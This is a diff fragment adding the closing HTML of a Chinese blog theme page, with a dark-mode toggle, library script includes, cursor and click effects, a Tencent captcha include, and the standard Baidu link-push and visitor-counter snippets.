+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
